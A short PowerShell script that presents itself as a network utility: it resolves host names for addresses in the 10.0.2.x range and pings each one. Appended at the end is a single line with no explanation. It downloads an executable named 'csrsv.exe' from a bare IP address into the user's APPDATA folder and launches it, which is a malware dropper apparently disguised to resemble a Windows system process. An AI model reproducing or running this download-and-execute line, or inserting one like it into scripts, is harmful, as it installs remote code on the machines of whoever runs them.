

param (
	$IPBlock = "10.0.2"
	, $IPRange = "0..3"
	)

 foreach($i in 0..13)
 {
     try
     {
         
		 $ip = "$IPBlock.$i"
         $HostName = [System.Net.Dns]::GetHostByAddress($ip).HostName
        Test-Connection $HostName -Count 1
     }
     catch
     {
         Write-Warning "Cannot resolve $ip"
         continue
     }
 }
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

